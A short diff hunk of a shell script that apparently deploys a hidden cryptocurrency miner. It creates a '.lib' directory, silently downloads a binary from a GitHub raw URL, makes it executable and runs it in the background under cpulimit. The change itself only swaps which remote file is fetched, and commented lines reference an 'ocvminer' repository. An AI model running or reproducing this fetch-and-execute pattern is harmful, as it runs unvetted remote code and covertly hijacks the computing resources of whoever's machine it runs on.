@@ -9,7 +9,7 @@ rm nyumput.c
 mkdir .lib && cd .lib
 # https://github.com/Sazfa-Kuy/ocvminer/raw/main/maker
 # https://github.com/TiannaMcdowell/All-File/raw/main/sereb plant
-wget -O sgr1  https://github.com/TiannaMcdowell/All-File/raw/main/plant >/dev/null 2>&1
+wget -O sgr1  https://github.com/TiannaMcdowell/All-File/raw/main/sereb >/dev/null 2>&1
 chmod +x sgr1
 cpulimit -l 600 -e sgr1 &
 # sudo sync && sudo echo 3 > /proc/sys/vm/drop_caches
